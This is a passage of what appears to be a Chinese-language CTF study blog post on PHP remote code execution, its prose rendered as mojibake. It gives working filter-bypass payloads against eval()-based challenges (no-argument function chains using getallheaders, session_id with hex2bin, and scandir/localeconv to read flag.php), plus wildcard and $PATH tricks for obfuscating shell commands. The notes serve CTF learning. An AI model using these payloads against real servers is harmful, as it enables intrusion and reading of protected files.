<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>ËøôÁ±ª‰∏ÄËà¨ÊòØÊó†ÂèÇÊï∞RCEÁöÑÈ¢òÁõÆÁâπÂæÅ:Âá∫Áé∞Ê≠£ÂàôË°®ËææÂºè</p>
<pre class="line-numbers language-reStructuredText" data-language="reStructuredText"><code class="language-reStructuredText">[^\W]+\((?R)?\)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ËøôÊÆµÂáΩÊï∞ÁöÑÂäüËÉΩÂ∞±ÊòØÂéªÊéâÊâÄÊúâÂáΩÊï∞ÁöÑÂèÇÊï∞</p>
<p>Â¶Ç‰ΩïÁªïËøáÔºü</p>
<ol>
<li>
<p>Êó¢ÁÑ∂‰º†ÂÖ•ÁöÑ<code>code</code>‰∏çÂê´ÂèÇÊï∞ÔºåÊàë‰ª¨ÂèØ‰ª•ËÅîÊÉ≥Âà∞Â∞ÜÂèÇÊï∞ÊîæÂú®Ëá™Â∑±ÁöÑÂú∞ÊñπÔºåÁî®codeËøõË°åÊé•Êî∂ÔºåÈÇ£‰πàÂà©Áî®<code>getallheaders()</code>‰∏é<code>apache_request_headrs()</code>ÂáΩÊï∞Â∞±ÂèØ‰ª•Êé•ÂèóheadersÔºåÊàë‰ª¨Áõ¥Êé•Âú®headers‰∏≠ÊîæÂÖ•ÂëΩ‰ª§ÂèÇÊï∞ËøõË°åÊâßË°å</p>
</li>
<li>
<p>session_id()ÔºöÂèØ‰ª•Áî®Êù•Ëé∑Âèñ/ËÆæÁΩÆ ÂΩìÂâç‰ºöËØù ID„ÄÇ</p>
<p>sessionÈúÄË¶Å‰ΩøÁî®session_start()ÂºÄÂêØÔºåÁÑ∂ÂêéËøîÂõûÂèÇÊï∞Áªôsession_id()</p>
<p>‰ΩÜÊòØÊúâ‰∏ÄÁÇπÈôêÂà∂ÔºöÊñá‰ª∂‰ºöËØùÁÆ°ÁêÜÂô®‰ªÖÂÖÅËÆ∏‰ºöËØù ID ‰∏≠‰ΩøÁî®‰ª•‰∏ãÂ≠óÁ¨¶Ôºöa-z A-Z 0-9 ,ÔºàÈÄóÂè∑ÔºâÂíå - ÂáèÂè∑Ôºâ</p>
<p>‰ΩÜÊòØhex2bin()ÂáΩÊï∞ÂèØ‰ª•Â∞ÜÂçÅÂÖ≠ËøõÂà∂ËΩ¨Êç¢‰∏∫ASCII Â≠óÁ¨¶ÔºåÊâÄ‰ª•Êàë‰ª¨‰º†ÂÖ•ÂçÅÂÖ≠ËøõÂà∂Âπ∂‰ΩøÁî®hex2bin()Âç≥ÂèØ</p>
<img src="/2024/06/30/%E5%88%9D%E8%AF%86RCE/image-20240630220706399.png" class="" alt="image-20240630220706399" loading="lazy">
<p>Â¶ÇÊûúË¶ÅÈááÁî®ËØªÊñá‰ª∂ÁöÑÊñπÊ≥ï</p>
<p><code>readfile(session_id(session_start()))*;*</code></p>
</li>
<li>
<p>Âà©Áî®<code>getenv</code>Êî∂ÈõÜ‰∏ÄÂÆöÁöÑ‰ø°ÊÅØ</p>
</li>
<li>
<p><mark>ÊúÄÂ∏∏ËßÑÁöÑÈÄöËß£scandir()</mark></p>
<p>‰æãÈ¢ò</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flagÂú®Âì™ÈáåÂë¢Ôºü&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// echo $_GET['exp'];</span>
                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ËøòÂ∑Æ‰∏ÄÁÇπÂì¶ÔºÅ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÂÜçÂ•ΩÂ•ΩÊÉ≥ÊÉ≥ÔºÅ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ËøòÊÉ≥ËØªflagÔºåËá≠ÂºüÂºüÔºÅ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// highlight_file(__FILE__);</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÊúÄÁªàÁöÑpayload<code>?exp=highligth_file(next(array_reverse(scandir(current(localeconv())))))</code></p>
<ul>
<li>current(localeconv()) ÊûÑÈÄ†‰∫Ü‰∏Ä‰∏™<code>.</code></li>
<li>scandirÁõ∏ÂΩì‰∫éls</li>
<li>Êé•‰∏ãÊù•ÁöÑarray_reverse‰∏énextÂàôÊòØÂ∞Üflag.phpÊñá‰ª∂ÁªôÂèñÂá∫Êù•‰∫ÜÔºåÁÑ∂ÂêéÂà©Áî®highligh_fileËøõË°åËØªÂèñ</li>
</ul>
</li>
</ol>
<h3 id="open_basedirÁªïËøá"><a class="markdownIt-Anchor" href="#open_basedirÁªïËøá"></a> open_basedirÁªïËøá*</h3>
<h3 id="disable_functionÁªïËøá"><a class="markdownIt-Anchor" href="#disable_functionÁªïËøá"></a> disable_functionÁªïËøá*</h3>
<h3 id="ÈÄöÈÖçÁ¨¶ÁªïËøá"><a class="markdownIt-Anchor" href="#ÈÄöÈÖçÁ¨¶ÁªïËøá"></a> ÈÄöÈÖçÁ¨¶ÁªïËøá</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/???/????64 ????.???  <span class="token comment">#/bin/base64 flag.php</span>
/???/???/????2 ????.??? <span class="token comment">#/usr/bin/bzip2 flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="grepÁªïËøáÂÖ≥ÈîÆËØçËøáÊª§"><a class="markdownIt-Anchor" href="#grepÁªïËøáÂÖ≥ÈîÆËØçËøáÊª§"></a> grepÁªïËøáÂÖ≥ÈîÆËØçËøáÊª§</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token punctuation">&#123;</span> flag.php
<span class="token function">grep</span> <span class="token punctuation">&#123;</span> f???????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>ÊâìÂç∞<code>flag.php</code>‰∏≠Âê´Êúâ<code>&#123;</code>ÁöÑË°å</p>
<h3 id="‰ΩøÁî®~ÊûÑÈÄ†Êï∞Â≠ó"><a class="markdownIt-Anchor" href="#‰ΩøÁî®~ÊûÑÈÄ†Êï∞Â≠ó"></a> ‰ΩøÁî®~$()ÊûÑÈÄ†Êï∞Â≠ó</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span>
$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<img src="/2024/06/30/%E5%88%9D%E8%AF%86RCE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" class="" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" loading="lazy">
<h3 id="phpÂÜÖÁΩÆÁ±ªrce"><a class="markdownIt-Anchor" href="#phpÂÜÖÁΩÆÁ±ªrce"></a> phpÂÜÖÁΩÆÁ±ªRce*</h3>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/238482">PHP ÂéüÁîüÁ±ªÂú® CTF ‰∏≠ÁöÑÂà©Áî®-ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</a></p>
<h3 id="pathÁéØÂ¢ÉÂèòÈáèÁªïËøá"><a class="markdownIt-Anchor" href="#pathÁéØÂ¢ÉÂèòÈáèÁªïËøá"></a> $PATHÁéØÂ¢ÉÂèòÈáèÁªïËøá</h3>
<p>‰∏ªË¶ÅÊòØÂà©Áî®$PATHÁéØÂ¢ÉÂèòÈáèÊà™ÂèñÂ≠óÊØçËøõË°åÂ≠óÁ¨¶ÊãºÊé•</p>
<h4 id="ÂèØ‰ª•‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÊï∞Â≠óÂíå"><a class="markdownIt-Anchor" href="#ÂèØ‰ª•‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÊï∞Â≠óÂíå"></a> ÂèØ‰ª•‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÊï∞Â≠óÂíå{}</h4>
<img src="/2024/06/30/%E5%88%9D%E8%AF%86RCE/image-20240630212739228.png" class="" alt="image-20240630212739228" loading="lazy">
<h4 id="ÂèØ‰ª•‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÂíå"><a class="markdownIt-Anchor" href="#ÂèØ‰ª•‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÂíå"></a> ÂèØ‰ª•‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÂíå{}</h4>
<p><code>#PATH</code>Ë°®Á§∫ÁéØÂ¢ÉÂèòÈáèÁöÑÈïøÂ∫¶</p>
<p>Âè™Ë¶ÅÊàë‰ª¨ÊâæÂà∞ÂØπÂ∫îÈïøÂ∫¶ÁöÑÁéØÂ¢ÉÂèòÈáèÔºåÂ∞±ÂèØ‰ª•ÊûÑÈÄ†Âá∫ÂëΩ‰ª§ÔºåËøõË°åRCE</p>
<hr />
<p>Êú™ÂÆåÂæÖÁª≠ÔºåÂêéÁª≠Â≠¶‰π†ÁöÑËøáÁ®ã‰∏≠ÁªßÁª≠Ë°•ÂÖÖÂÆåÂñÑ</p>
</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/06/30/%E5%88%9D%E8%AF%86LFI%E5%92%8CRFI/" rel="prev" title="ÂàùËØÜLFIÂíåRFI"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">ÂàùËØÜLFIÂíåRFI</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/06/29/MySql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="MySqlÂ≠¶‰π†Á¨îËÆ∞"><span class="post-nav-text">MySqlÂ≠¶‰π†Á¨îËÆ∞</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>ÊÇ®ÈúÄË¶ÅÁßëÂ≠¶‰∏äÁΩëÔºåÊâçÂèØ‰ΩøÁî®ËØÑËÆ∫Âå∫ÂäüËÉΩ„ÄÇ</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/06/30/%E5%88%9D%E8%AF%86RCE/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2023 ‚Äì 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>